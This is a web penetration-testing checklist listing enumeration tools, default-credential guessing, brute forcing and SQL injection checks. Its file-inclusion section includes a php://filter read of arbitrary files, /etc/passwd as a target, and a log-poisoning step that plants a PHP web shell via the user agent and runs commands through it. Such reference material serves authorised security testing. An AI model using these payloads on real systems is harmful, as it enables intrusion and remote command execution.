# Web Enum Quick Reference  
HTTP and HTTPS Checklist   
- [ ] Look for service name and version - searchsploit / google for exploits   
- [ ] Service specific scanners: wpscan, sqlmap     
- [ ] Check for a robots.txt page    
- [ ] Scan page with Wappanalyzer  
- [ ] Scan for sub directories and pages - admin pages?, login pages?, file upload?, user input fields?    
- [ ] Admin page - access misconfigs, login?       
- [ ] Log in pages - guess default creds, admin:admin, admin:password   
- [ ] File upload pages - what types of files are accepted?, what checks are being implemented?  
- [ ] User input fields: SQL injection, cross site scripting   
- [ ] Intercept HTTP requests with Burp and examine    	

Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
[Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions  
**Scan for sub directories and pages** 	
	
	
        nmap http scripts     
        nikto -h http://127.0.0.1:80/     
        dirb http://127.0.0.1/   (default word list: common.txt)     
        gobuster dir -u http://127.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z     
	ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -c -v  
	feroxbuster -u http://target.com -w /usr/share/dirb/wordlists/common.txt -d [recurson depth] -t [threads] -s [status codes] 

	whatweb http://target  
	wfuzz -c --hc=404 -R 2 -w /usr/share/dirb/wordlists/common.txt http://target/fuzz   
	
	
## Web app specific  
Wordpress: wpscan 


Jenkins: [pwn jenkins](https://github.com/Scr1ptK1ddie/pwn_jenkins)  


## Login pages   
	
	Default creds - admin: admin, admin:password, service specific default creds   
	Register a new user  
	Brute force log in  
	SQL injection  

## File Upload Pages  

Local File Include  
[Local File Inclusion](http://resources.infosecinstitute.com/local-file-inclusion-code-execution/#gref)   
[Guide to LFI](http://www.securityidiots.com/Web-Pentest/LFI/guide-to-lfi.html)    
	
	
	/etc/passwd, etc.
	can you include a remote file?
	?test=php://filter/convert.base64-encode/resource=/filepath      -> base64 encode /decode  
Log Poisoning 
	open: /log/apache2/access.log 
	send payload as user agent string: <?php system($_GET['cmd']); ?>    
	/log/apache2/access.log&cmd=id    

	
[SQL Injection Cheatsheet](https://github.com/codingo/OSCP-2/blob/master/Documents/SQL%20Injection%20Cheatsheet.md) 
	 
 
	
	
	
References:   
[OWASP Web App Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)    
[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/Glossary.html)    
[Bypassing File Upload Restrictions ](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html)      
[Web vulnerabilities to gain access to the system - paper](https://www.exploit-db.com/papers/13017/)     

Basic SQLi 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html 
http://www.sqlinjection.net/login/
